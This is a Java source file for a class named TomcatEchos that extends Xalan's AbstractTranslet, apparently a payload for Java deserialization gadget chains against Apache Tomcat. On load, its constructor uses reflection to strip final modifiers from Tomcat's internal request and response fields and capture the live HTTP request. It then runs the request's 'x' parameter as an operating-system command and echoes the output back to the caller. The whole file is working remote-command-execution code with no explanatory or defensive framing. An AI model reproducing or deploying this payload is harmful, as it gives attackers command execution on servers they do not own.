import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class TomcatEchos extends AbstractTranslet {
    public TomcatEchos() {
        try{
            Field WRAP_SAME_OBJECT = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            WRAP_SAME_OBJECT.setAccessible(true);
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            lastServicedRequest.setAccessible(true);
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            lastServicedResponse.setAccessible(true);

            // final Modify
            Field modifiersfield = Field.class.getDeclaredField("modifiers");
            modifiersfield.setAccessible(true);
            modifiersfield.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiersfield.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~Modifier.FINAL);

            Boolean wrap_same_object = WRAP_SAME_OBJECT.getBoolean(null);
            ThreadLocal<ServletRequest> requestThreadLocal = (ThreadLocal<ServletRequest>) lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> responseThreadLocal = (ThreadLocal<ServletResponse>) lastServicedResponse.get(null);

            WRAP_SAME_OBJECT.setBoolean(null, true);
            lastServicedRequest.set(null, new ThreadLocal<>());
            lastServicedResponse.set(null, new ThreadLocal<>());

            ServletRequest req = requestThreadLocal.get();
            ServletResponse resp = responseThreadLocal.get();
            String params = req.getParameter("x");
            String res = execX(params);

            resp.getWriter().println(res);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public static String execX(String cmd) {
        try{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String str = "";
            String line;
            while ((line = reader.readLine()) != null){
                str += line;
            }
            return str;
        }catch (Exception e){
            e.printStackTrace();
        }
        return "?x=whoami";
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
